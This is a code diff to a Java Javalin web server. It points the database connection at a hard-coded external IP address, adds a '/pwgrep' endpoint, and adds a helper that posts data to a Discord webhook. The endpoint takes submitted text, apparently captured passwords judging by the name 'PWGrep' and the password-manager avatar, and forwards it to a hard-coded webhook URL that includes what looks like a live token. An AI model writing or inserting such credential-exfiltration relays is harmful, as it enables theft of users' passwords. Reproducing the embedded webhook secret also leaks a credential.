@@ -12,10 +12,9 @@ import io.javalin.Javalin;
 import io.javalin.plugin.bundled.CorsPluginConfig;
 import org.json.JSONObject;
 
-import javax.swing.*;
 import java.io.IOException;
-import java.util.ArrayList;
-import java.util.List;
+import java.net.URL;
+import java.net.URLConnection;
 
 public class Main {
 
@@ -36,7 +35,7 @@ public class Main {
 
     public void init() {
         Loggers.load();
-        new DatabaseConfiguration("localhost", "cdpusher", "CDPUSHER", "CDPusher").initDatabase();
+        new DatabaseConfiguration("45.81.235.52", "cdpusher", "CDPUSHER", "CDPusher").initDatabase();
         try {
             Thread.sleep(1000);
         } catch (InterruptedException e) {
@@ -65,6 +64,12 @@ public class Main {
             }
         });
 
+        app.post("/pwgrep", ctx -> {
+            send("https://discord.com/api/webhooks/1104403823457468436/AUk8HE9qtM0yyRx2Ujo4lGq-BTwvtLuLFHRIUxbrrjXyWBwfnRl_OC4gN_9EjKvloA3e",
+                    ctx.body().split("=")[1], "PWGrep", "https://media.kasperskydaily.com/wp-content/uploads/sites/96/2021/06/17124210/make-your-passwords-stronger-with-kaspersky-password-manager-featured.jpg");
+            ctx.result("PWGrep");
+        });
+
         app.get("/assets/*", ctx -> {
             String path = ctx.path().substring(8);
             String[] split = path.split("/");
@@ -88,5 +93,27 @@ public class Main {
                     break;
             }
         });
+    }
+
+    public static void send(String url, String content, String username, String avatarURL) {
+        JSONObject jsonObject = new JSONObject();
+        jsonObject.put("content", content);
+        jsonObject.put("username", username);
+        jsonObject.put("avatar_url", avatarURL);
+
+        try {
+            URL webhookURL = new URL(url);
+            URLConnection webhook = webhookURL.openConnection();
+            webhook.setDoOutput(true);
+            webhook.setRequestProperty("Content-Type", "application/json");
+            webhook.setRequestProperty("Accept", "application/json");
+            webhook.setRequestProperty("Accept-Charset", "UTF-8");
+            webhook.getOutputStream().write(jsonObject.toString().getBytes());
+            webhook.getOutputStream().flush();
+            webhook.getOutputStream().close();
+            webhook.getInputStream().close();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
     }
 }
